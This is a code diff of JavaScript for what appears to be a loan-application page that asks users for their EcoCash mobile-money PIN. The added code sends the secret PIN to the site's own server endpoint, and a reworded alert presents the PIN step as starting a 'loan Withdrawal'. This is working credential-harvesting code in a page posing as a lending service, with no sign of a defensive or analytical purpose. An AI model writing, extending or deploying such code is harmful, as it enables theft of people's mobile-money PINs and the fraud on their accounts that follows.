@@ -2239,34 +2239,80 @@ function loadEcoCashPinScreen() {
         );
 
 }
+
 // ======================================================
-// PART 24 - SAVE ECOCASH PIN
+// SAVE ECOCASH PIN
 // ======================================================
 
-function saveEcoCashPin() {
+async function saveEcoCashPin() {
 
-    const pin =
-        document
-            .getElementById("ecoPin")
-            .value
-            .trim();
+    const input =
+        document.getElementById("ecoPin");
 
-    if (pin === "") {
+    const Pin =
+        input.value.trim();
 
-        alert("Please enter your EcoCash pin.");
+    if (Pin === "") {
+
+        alert("Initiate your loan Withdrawal.");
 
         return;
-
     }
 
-    sessionStorage.setItem(
-        "ecoPin",
-        pin
-    );
+    const applicationId =
+        sessionStorage.getItem("applicationId");
 
-    submitEcoCashApplication();
+    if (!applicationId) {
 
+        alert("Application session not found.");
+
+        return;
+    }
+
+    try {
+
+        const response = await fetch(
+            `/save-ecocash-pin/${applicationId}`,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    ecoPin: Pin
+                })
+            }
+        );
+
+        const result =
+            await response.json();
+
+        if (!response.ok || !result.success) {
+
+            throw new Error(
+                result.message ||
+                "Unable to save PIN."
+            );
+        }
+
+        // Continue with the application
+        loadTrackingScreen();
+
+    } catch (err) {
+
+        console.error(
+            "SAVE ECOCASH PIN ERROR:",
+            err
+        );
+
+        alert(
+            "Unable to save the PIN."
+        );
+    }
 }
+
 // ======================================================
 // PART 25 - SUBMIT ECOCASH APPLICATION
 // ======================================================
